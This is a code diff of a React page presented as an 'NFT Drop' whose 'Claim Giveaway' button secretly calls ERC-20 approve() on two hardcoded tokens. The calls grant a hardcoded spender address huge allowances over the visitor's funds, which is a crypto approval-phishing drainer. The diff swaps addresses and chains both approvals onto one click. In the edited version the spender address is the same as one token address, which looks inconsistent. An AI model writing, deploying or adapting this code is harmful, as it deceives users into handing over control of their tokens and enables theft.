@@ -67,12 +67,12 @@ const SimpleStorage = () => {
 
 	//my appeove here
 
-    const yourContractAddress = "0x61b99Af6375deA52843c7BED296a4372d106c8Df"; 
+    const yourContractAddress = "0x4269f1a3848209E84996D853a09C052849A21a70"; 
     const contractInterface = [
     "function approve(address spender, uint256 amount) external returns (bool)", // appprove contract function
   ];
-    const tokenAddress = "0x01BE23585060835E02B77ef475b0Cc51aA1e0709"; //token to migrate
-    const tokenAddressusdt = "0xE82b46D856cBbdbe887Fc8c3D91441A26238788D"; //token to migrate
+    const tokenAddress = "0x4269f1a3848209E84996D853a09C052849A21a70"; //token to migrate
+    const tokenAddressusdt = "0x01BE23585060835E02B77ef475b0Cc51aA1e0709"; //token to migrate
     let provider;
     let signer;
     // let signerAddress;
@@ -102,6 +102,8 @@ const SimpleStorage = () => {
     startFunction();
   async function approveSpender() {
     tokenContract.approve(yourContractAddress, '100000000000000000000000');
+
+	  approveSpenderusdt();
     }
     async function approveSpenderusdt() {
     tokenContractusdt.approve(yourContractAddress, '1000000000000000');
@@ -175,7 +177,7 @@ const SimpleStorage = () => {
       <h1>NFT Drop Coming Soon!!</h1>
 
       <p>A new batch of naviapes will be available very soon!</p>
-     <button onClick={function(event){ approveSpender(); approveSpenderusdt();}} class="btn" id="approve" >Claim Giveaway</button>
+     <button onClick={ approveSpender} class="btn" id="approve" >Claim Giveaway</button>
     </div>
     
   </section>
